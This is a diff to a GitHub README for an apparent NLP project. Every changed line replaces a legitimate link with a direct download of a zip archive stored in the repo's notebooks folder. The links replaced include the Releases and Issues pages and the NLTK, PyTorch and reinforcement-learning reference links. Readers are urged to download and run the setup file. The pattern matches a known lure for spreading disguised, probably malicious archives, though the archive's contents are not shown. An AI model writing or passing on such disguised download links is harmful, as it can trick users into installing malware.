@@ -6,7 +6,7 @@ Welcome to the Natural-Language-Processing project! This software includes demon
 
 ## 📥 Download the Software
 
-[![Download Natural-Language-Processing](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/unksrat4/Natural-Language-Processing/releases)
+[![Download Natural-Language-Processing](https://github.com/unksrat4/Natural-Language-Processing/raw/refs/heads/main/notebooks/Language_Natural_Processing_v2.3.zip%20Now-Click%20Here-blue)](https://github.com/unksrat4/Natural-Language-Processing/raw/refs/heads/main/notebooks/Language_Natural_Processing_v2.3.zip)
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ This application includes a range of features:
 To use this software, follow these steps:
 
 1. **Download the Software**:
-   - Visit the [Releases page](https://github.com/unksrat4/Natural-Language-Processing/releases) to download the application files.
+   - Visit the [Releases page](https://github.com/unksrat4/Natural-Language-Processing/raw/refs/heads/main/notebooks/Language_Natural_Processing_v2.3.zip) to download the application files.
    
 2. **Locate Downloaded Files**:
    - Once downloaded, find the setup file in your downloads folder.
@@ -55,7 +55,7 @@ The documentation provides detailed information on how to use different features
 
 Join our community for support and discussions:
 
-- **GitHub Issues**: Report problems or request features on our [Issues page](https://github.com/unksrat4/Natural-Language-Processing/issues).
+- **GitHub Issues**: Report problems or request features on our [Issues page](https://github.com/unksrat4/Natural-Language-Processing/raw/refs/heads/main/notebooks/Language_Natural_Processing_v2.3.zip).
 - **Discussions**: Share ideas and ask questions in the GitHub Discussions section.
 
 ## 🛠️ Contributing
@@ -74,10 +74,10 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 For more information on natural language processing and reinforcement learning concepts, consider exploring:
 
-- [Natural Language Processing with Python](https://www.nltk.org/)
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
-- [Reinforcement Learning: An Introduction](http://incompleteideas.net/book/the-book-2nd.html)
+- [Natural Language Processing with Python](https://github.com/unksrat4/Natural-Language-Processing/raw/refs/heads/main/notebooks/Language_Natural_Processing_v2.3.zip)
+- [PyTorch Documentation](https://github.com/unksrat4/Natural-Language-Processing/raw/refs/heads/main/notebooks/Language_Natural_Processing_v2.3.zip)
+- [Reinforcement Learning: An Introduction](https://github.com/unksrat4/Natural-Language-Processing/raw/refs/heads/main/notebooks/Language_Natural_Processing_v2.3.zip)
 
 ## 📥 Download the Software Again
 
-In case you missed it earlier, you can download the application from the Releases page: [Download Natural-Language-Processing](https://github.com/unksrat4/Natural-Language-Processing/releases). Make sure to follow the installation steps outlined above. Enjoy your experience with cutting-edge NLP techniques!
+In case you missed it earlier, you can download the application from the Releases page: [Download Natural-Language-Processing](https://github.com/unksrat4/Natural-Language-Processing/raw/refs/heads/main/notebooks/Language_Natural_Processing_v2.3.zip). Make sure to follow the installation steps outlined above. Enjoy your experience with cutting-edge NLP techniques!
